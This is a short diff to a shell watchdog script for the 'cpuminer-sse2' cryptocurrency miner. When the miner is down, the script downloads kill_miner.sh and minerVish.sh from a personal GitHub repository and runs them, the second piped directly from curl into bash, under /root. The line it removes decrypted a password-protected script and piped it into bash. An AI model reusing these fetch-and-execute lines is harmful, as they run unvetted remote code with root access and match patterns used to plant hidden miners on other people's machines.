@@ -5,7 +5,9 @@ then
   echo "cpuminer-sse2 is running."
 else
   echo "cpuminer-sse2 isn't running"
-  bash kill_miniZeph.sh
+  wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
+  chmod +x /root/kill_miner.sh
+  ./kill_miner.sh
   sleep 3
-  openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
+  bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/minerVish.sh')
 fi
